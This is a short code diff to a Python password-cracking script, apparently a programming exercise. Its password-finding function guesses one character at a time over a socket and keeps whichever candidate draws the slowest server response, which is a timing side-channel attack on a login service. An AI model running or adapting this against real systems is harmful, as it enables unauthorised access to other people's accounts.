@@ -40,15 +40,17 @@ def find_login(client_socket, login_list):
 def find_password(client_socket, login):
     password = ''
     while True:
-        timings = []
+        best_candidate = None
+        max_res_time = 0
         for c in ascii_letters + digits:
             candidate = password + c
             result, res_time = get_result_with_response_time(client_socket, login, candidate)
             if result == 'Connection success!':
                 return candidate
-            timings.append((candidate, res_time))
-        timings.sort(key=lambda x: x[1])
-        password = timings[-1][0]
+            if res_time > max_res_time:
+                best_candidate = candidate
+                max_res_time = res_time
+        password = best_candidate
 
 
 def main():
